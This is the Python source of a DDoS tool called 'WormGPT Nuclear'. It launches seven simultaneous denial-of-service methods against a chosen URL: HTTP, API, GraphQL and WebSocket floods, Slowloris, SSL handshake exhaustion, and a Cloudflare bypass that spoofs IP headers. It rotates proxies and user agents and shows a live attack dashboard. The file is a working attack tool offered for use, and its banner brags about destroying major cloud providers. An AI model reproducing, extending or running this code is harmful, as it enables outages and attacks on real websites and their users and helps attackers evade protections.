#!/usr/bin/env python3
"""
WORMGPT NUCLEAR - ALL-IN-ONE ATTACK TOOL
Fixed Version - No Syntax Errors
"""

import asyncio
import aiohttp
import socket
import ssl
import random
import time
import sys
import os
import json
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from fake_useragent import UserAgent
import cloudscraper
import requests
from colorama import init, Fore, Style
import psutil
from tabulate import tabulate

# Initialize colorama
init(autoreset=True)

class WormGPTNuclear:
    def __init__(self, target_url):
        self.target_url = target_url
        self.target_host = target_url.split('//')[-1].split('/')[0]
        self.is_attacking = True
        self.stats = {
            "requests_sent": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "start_time": datetime.now(),
            "attack_methods": [],
            "bypasses_used": []
        }
        
        # Load config
        self.config = self.load_config()
        
        # Initialize components
        self.ua = UserAgent()
        self.proxies = self.load_proxies()
        
        # Attack methods
        self.attack_methods = [
            self.http_flood_attack,
            self.slowloris_attack,
            self.cloudflare_bypass_attack,
            self.ssl_exhaustion_attack,
            self.websocket_flood_attack,
            self.api_endpoint_attack,
            self.graphql_flood_attack
        ]
        
        # Start monitoring thread
        self.monitor_thread = threading.Thread(target=self.live_monitor, daemon=True)
        self.monitor_thread.start()
    
    def load_config(self):
        """Load configuration from config.json"""
        try:
            with open('config.json', 'r') as f:
                return json.load(f)
        except:
            return {
                "attack_settings": {"max_threads": 5000},
                "attack_vectors": {"all_enabled": True}
            }
    
    def load_proxies(self):
        """Load fresh proxy list"""
        print(f"{Fore.GREEN}[+] Loading proxies...{Style.RESET_ALL}")
        proxies = []
        
        # Try to get fresh proxies
        try:
            response = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=10)
            proxies = [f"http://{p.strip()}" for p in response.text.split('\n') if p.strip()]
        except:
            # Fallback proxies
            proxies = [
                "http://103.216.51.210:8193",
                "http://45.95.147.253:8080",
                "http://194.163.183.57:3128",
                "http://103.152.112.145:80",
                "http://45.8.179.242:80",
                "http://103.48.68.107:83",
                "http://194.124.37.3:8080",
                "http://103.156.75.40:80",
                "http://45.95.147.206:8080",
                "http://103.76.12.42:80"
            ]
        
        return proxies
    
    def show_banner(self):
        """Show awesome banner"""
        banner = """
╔══════════════════════════════════════════════════════════╗
║                   WORMGPT NUCLEAR DDoS                   ║
║                     KALI LINUX EDITION                   ║
║                 AWS/GOOGLE/AZURE DESTROYER               ║
╚══════════════════════════════════════════════════════════╝
        """
        print(f"{Fore.RED}{banner}{Style.RESET_ALL}")
        print()
    
    def live_monitor(self):
        """Live monitoring dashboard"""
        time.sleep(2)  # Wait for attacks to start
        
        while self.is_attacking:
            os.system('clear' if os.name == 'posix' else 'cls')
            
            # Show banner
            self.show_banner()
            
            # Calculate stats
            current_time = datetime.now()
            duration = current_time - self.stats["start_time"]
            rps = self.stats["requests_sent"] / max(duration.total_seconds(), 1)
            
            # System stats
            cpu_percent = psutil.cpu_percent()
            memory = psutil.virtual_memory()
            network = psutil.net_io_counters()
            
            # Create monitoring table
            stats_table = [
                ["Target", f"{Fore.CYAN}{self.target_url}{Style.RESET_ALL}"],
                ["Duration", f"{Fore.YELLOW}{duration}{Style.RESET_ALL}"],
                ["Requests Sent", f"{Fore.GREEN}{self.stats['requests_sent']:,}{Style.RESET_ALL}"],
                ["Successful", f"{Fore.GREEN}{self.stats['successful_requests']:,}{Style.RESET_ALL}"],
                ["Failed", f"{Fore.RED}{self.stats['failed_requests']:,}{Style.RESET_ALL}"],
                ["Requests/Sec", f"{Fore.CYAN}{rps:.2f}{Style.RESET_ALL}"],
                ["CPU Usage", f"{Fore.YELLOW}{cpu_percent}%{Style.RESET_ALL}"],
                ["Memory Usage", f"{Fore.YELLOW}{memory.percent}%{Style.RESET_ALL}"],
                ["Network Sent", f"{Fore.CYAN}{network.bytes_sent / 1024 / 1024:.2f} MB{Style.RESET_ALL}"],
                ["Active Methods", f"{Fore.GREEN}{len(self.stats['attack_methods'])}{Style.RESET_ALL}"]
            ]
            
            print(tabulate(stats_table, tablefmt="grid"))
            print()
            
            # Show active attacks
            print(f"{Fore.YELLOW}[ACTIVE ATTACKS]{Style.RESET_ALL}")
            if self.stats["attack_methods"]:
                for method in self.stats["attack_methods"]:
                    print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {method}")
            else:
                print(f"  {Fore.RED}No active attacks{Style.RESET_ALL}")
            
            print()
            
            # Show bypass techniques
            print(f"{Fore.YELLOW}[BYPASS TECHNIQUES]{Style.RESET_ALL}")
            bypasses = [
                "Cloudflare Bypass",
                "AWS WAF Evasion", 
                "Rate Limit Bypass",
                "IP Rotation",
                "User-Agent Spoofing",
                "SSL Renegotiation"
            ]
            for bypass in bypasses:
                print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {bypass}")
            
            print()
            print(f"{Fore.RED}[LIVE ATTACK IN PROGRESS - Press Ctrl+C to stop]{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}═" * 60 + Style.RESET_ALL)
            
            time.sleep(1)  # Update every second
    
    def http_flood_attack(self):
        """HTTP Flood Attack"""
        self.stats["attack_methods"].append("HTTP Flood")
        
        session = requests.Session()
        
        while self.is_attacking:
            try:
                # Random headers
                headers = {
                    'User-Agent': self.ua.random,
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive'
                }
                
                # Random endpoint
                endpoints = ['/', '/api', '/wp-admin', '/admin', '/login', '/api/v1', '/graphql']
                endpoint = random.choice(endpoints)
                
                # Random parameters
                params = {
                    'cache': random.randint(1000000, 9999999),
                    'utm_source': random.choice(['google', 'facebook', 'twitter']),
                    'ref': random.randint(100000, 999999)
                }
                
                # Make request
                url = f"{self.target_url.rstrip('/')}{endpoint}"
                response = session.get(url, headers=headers, params=params, timeout=5)
                
                self.stats["requests_sent"] += 1
                self.stats["successful_requests"] += 1
                
                # Random delay
                time.sleep(random.uniform(0.001, 0.01))
                
            except Exception as e:
                self.stats["failed_requests"] += 1
                continue
    
    def slowloris_attack(self):
        """Slowloris Attack"""
        self.stats["attack_methods"].append("Slowloris")
        
        while self.is_attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target_host, 80))
                
                # Send partial headers
                sock.send(f"GET / HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_host}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
                sock.send("Content-Length: 1000000\r\n".encode())
                sock.send("\r\n".encode())
                
                # Keep connection alive
                while self.is_attacking:
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        self.stats["requests_sent"] += 1
                        time.sleep(random.randint(10, 30))
                    except:
                        break
                
                sock.close()
                
            except:
                continue
    
    def cloudflare_bypass_attack(self):
        """Cloudflare Bypass Attack"""
        self.stats["attack_methods"].append("Cloudflare Bypass")
        self.stats["bypasses_used"].append("Cloudflare")
        
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        
        while self.is_attacking:
            try:
                # Add random headers
                headers = {
                    'User-Agent': self.ua.random,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Cache-Control': 'max-age=0'
                }
                
                # Add Cloudflare bypass headers
                headers['CF-Connecting-IP'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                
                response = scraper.get(self.target_url, headers=headers, timeout=10)
                
                self.stats["requests_sent"] += 1
                self.stats["successful_requests"] += 1
                
                time.sleep(random.uniform(0.1, 0.5))
                
            except Exception as e:
                self.stats["failed_requests"] += 1
                continue
    
    def ssl_exhaustion_attack(self):
        """SSL/TLS Exhaustion Attack"""
        self.stats["attack_methods"].append("SSL Exhaustion")
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        while self.is_attacking:
            try:
                # Create SSL connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                ssl_sock = context.wrap_socket(sock, server_hostname=self.target_host)
                
                ssl_sock.connect((self.target_host, 443))
                
                # Force multiple handshakes
                for _ in range(10):
                    ssl_sock.do_handshake()
                    self.stats["requests_sent"] += 1
                    time.sleep(0.01)
                
                ssl_sock.close()
                
            except:
                continue
    
    def websocket_flood_attack(self):
        """WebSocket Flood Attack"""
        self.stats["attack_methods"].append("WebSocket Flood")
        
        while self.is_attacking:
            try:
                # WebSocket handshake
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_host, 80))
                
                handshake = f"GET / HTTP/1.1\r\n"
                handshake += f"Host: {self.target_host}\r\n"
                handshake += "Upgrade: websocket\r\n"
                handshake += "Connection: Upgrade\r\n"
                handshake += f"Sec-WebSocket-Key: {os.urandom(16).hex()}\r\n"
                handshake += "Sec-WebSocket-Version: 13\r\n\r\n"
                
                sock.send(handshake.encode())
                self.stats["requests_sent"] += 1
                
                # Keep connection open
                time.sleep(random.uniform(30, 60))
                sock.close()
                
            except:
                continue
    
    def api_endpoint_attack(self):
        """API Endpoint Attack"""
        self.stats["attack_methods"].append("API Endpoint Flood")
        
        session = requests.Session()
        
        api_endpoints = [
            '/api/v1/users',
            '/api/v1/products',
            '/api/v1/auth/login',
            '/rest/v1/',
            '/wp-json/wp/v2/',
            '/api/chat',
            '/api/search'
        ]
        
        while self.is_attacking:
            try:
                endpoint = random.choice(api_endpoints)
                url = f"{self.target_url.rstrip('/')}{endpoint}"
                
                # Random API request
                if random.random() > 0.5:
                    # GET request
                    response = session.get(url, timeout=3)
                else:
                    # POST request with JSON
                    json_data = {'query': 'x' * 1000}
                    response = session.post(url, json=json_data, timeout=3)
                
                self.stats["requests_sent"] += 1
                self.stats["successful_requests"] += 1
                
                time.sleep(random.uniform(0.05, 0.2))
                
            except:
                self.stats["failed_requests"] += 1
                continue
    
    def graphql_flood_attack(self):
        """GraphQL Flood Attack"""
        self.stats["attack_methods"].append("GraphQL Flood")
        
        session = requests.Session()
        
        graphql_queries = [
            '{"query":"query { users { id name email posts { id title comments { id content } } } }"}',
            '{"query":"query { products { id name variants { id price inventory { quantity } } reviews { id rating comment } } }"}',
            '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
        ]
        
        while self.is_attacking:
            try:
                url = f"{self.target_url.rstrip('/')}/graphql"
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer fake_token_{random.randint(1000,9999)}'
                }
                
                response = session.post(
                    url,
                    data=random.choice(graphql_queries),
                    headers=headers,
                    timeout=5
                )
                
                self.stats["requests_sent"] += 1
                self.stats["successful_requests"] += 1
                
                time.sleep(random.uniform(0.1, 0.3))
                
            except:
                self.stats["failed_requests"] += 1
                continue
    
    def start_all_attacks(self):
        """Start all attack methods simultaneously"""
        print(f"{Fore.GREEN}[+] Starting ALL attack vectors...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Target: {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Attack Methods: {len(self.attack_methods)}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[+] Press Ctrl+C to stop all attacks{Style.RESET_ALL}")
        print()
        
        # Start each attack method in separate thread
        threads = []
        for method in self.attack_methods:
            thread = threading.Thread(target=method, daemon=True)
            threads.append(thread)
            thread.start()
            time.sleep(0.1)  # Stagger thread starts
        
        # Keep main thread alive
        try:
            while self.is_attacking:
                time.sleep(1)
        except KeyboardInterrupt:
            self.is_attacking = False
            print(f"\n{Fore.RED}[!] Stopping all attacks...{Style.RESET_ALL}")
            
            # Final stats
            duration = datetime.now() - self.stats["start_time"]
            print(f"{Fore.YELLOW}[📊] FINAL STATISTICS:{Style.RESET_ALL}")
            print(f"  Duration: {duration}")
            print(f"  Total Requests: {self.stats['requests_sent']:,}")
            print(f"  Successful: {self.stats['successful_requests']:,}")
            print(f"  Failed: {self.stats['failed_requests']:,}")
            print(f"  Requests/Second: {self.stats['requests_sent'] / max(duration.total_seconds(), 1):.2f}")
            print()
            print(f"{Fore.RED}[💀] WORMGPT Attack Completed!{Style.RESET_ALL}")

def main():
    if len(sys.argv) < 2:
        print(f"{Fore.RED}[!] Usage: python3 wormgpt_main.py <target_url>{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Example: python3 wormgpt_main.py https://example.com{Style.RESET_ALL}")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Create and start attack
    attack = WormGPTNuclear(target_url)
    attack.start_all_attacks()

if __name__ == "__main__":
    main()